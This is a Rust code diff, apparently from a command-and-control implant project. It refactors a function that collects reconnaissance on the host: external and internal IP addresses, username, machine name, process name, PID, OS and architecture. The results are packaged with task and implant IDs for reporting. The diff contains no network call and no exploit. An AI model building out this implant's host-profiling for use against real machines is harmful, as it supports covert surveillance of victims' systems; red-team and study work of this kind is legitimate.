@@ -8,15 +8,30 @@ use users::get_current_username;
 use crate::errors::ImplantError;
 use crate::models::system_info::SystemInfo;
 
-pub fn gather_system_info() {
-    println!("External ip address: {:?}", get_external_ip_address());
-    println!("Internal ip address: {:?}", get_internal_ip_address());
-    println!("OS type: {}", env::consts::OS);
-    println!("Current username: {:?}", get_current_user());
-    println!("Machine name: {:?}", gethostname());
-    println!("Current process name: {:?}", get_current_executable_name());
-    println!("Current PID: {}", process::id());
-    println!("Architecture: {}", env::consts::ARCH);
+pub fn gather_system_info(task_id: String, implant_id: &str) -> Result<SystemInfo, ImplantError> {
+    let external_ip_address = get_external_ip_address()?;
+    let internal_ip_address = get_internal_ip_address()?;
+    let os_type = (env::consts::OS).to_owned();
+    let machine_user = get_current_user().into_string()?;
+    let machine_name = gethostname().into_string()?;
+    let process_name = get_current_executable_name();
+    let pid = process::id().try_into().unwrap();
+    let architecture = (env::consts::ARCH).to_owned();
+
+    let system_info = SystemInfo::new(
+        external_ip_address,
+        internal_ip_address,
+        os_type,
+        machine_user,
+        machine_name,
+        process_name,
+        pid,
+        architecture,
+        task_id,
+        implant_id.to_owned(),
+    );
+
+    Ok(system_info)
 }
 
 fn get_external_ip_address() -> Result<String, ImplantError> {
@@ -46,9 +61,15 @@ fn get_current_user() -> OsString {
     }
 }
 
-fn get_current_executable_name() -> Option<String> {
-    std::env::current_exe()
+fn get_current_executable_name() -> String {
+    let exec_name_opt = std::env::current_exe()
         .ok()
         .and_then(|pb| pb.file_name().map(|s| s.to_os_string()))
-        .and_then(|s| s.into_string().ok())
+        .and_then(|s| s.into_string().ok());
+
+    if let Some(exec_name) = exec_name_opt {
+        exec_name
+    } else {
+        String::new()
+    }
 }
